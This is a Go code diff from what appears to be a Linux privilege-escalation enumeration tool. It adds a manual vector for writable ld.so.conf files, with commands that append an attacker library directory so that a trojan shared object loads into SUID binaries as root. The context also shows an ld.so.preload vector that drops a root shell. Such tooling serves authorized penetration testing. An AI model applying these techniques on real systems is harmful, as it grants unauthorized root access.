@@ -444,14 +444,23 @@ func enumerateCredential(p *AutoPrivilege, f Finding) {
 }
 
 // --- Preload enumeration ---
-// Only a WRITABLE ld.so.preload yields a vector: entries already configured
+// Only WRITABLE loader surfaces yield vectors: entries already configured
 // by someone else are an investigation lead, not an escalation path for the
-// current user. The injection needs a compiled shared object, so the vector
-// is manual — the tool prints the technique and states the compiler
-// requirement instead of pretending it built anything.
+// current user. The ld.so.preload injection needs a compiled shared object,
+// and the ld.so.conf(.d) injection needs a later ldconfig run — both are
+// manual, with the exact technique and the honest requirement spelled out.
 func enumeratePreload(p *AutoPrivilege, f Finding) {
-	if !strings.Contains(f.Description, "writable") {
+	// Case-insensitive gate: scanner descriptions open with "Writable"
+	// while the ld.so.preload one embeds lowercase "writable" mid-sentence.
+	if !strings.Contains(strings.ToLower(f.Description), "writable") {
 		return // informational-only finding: nothing to hand over
+	}
+	if f.Target == preloadPaths.conf || f.Target == preloadPaths.confD {
+		addManualVector(p, "library path injection", "preload", f.Target,
+			fmt.Sprintf("printf '/tmp/evil-libs\\n' >> %s\nldconfig   # needs root: it runs on package installs and boot anyway\n# SUID binaries resolve through the cache — a trojan .so in /tmp/evil-libs loads with euid 0", f.Target),
+			RiskHigh,
+			map[string]string{"note": "absorbed by the system's next ldconfig run; survives until the .conf entry is removed"})
+		return
 	}
 	addManualVector(p, "ld.so preload injection", "preload", f.Target,
 		"# build a shared object whose constructor drops a root shell (needs gcc on target), then\n"+
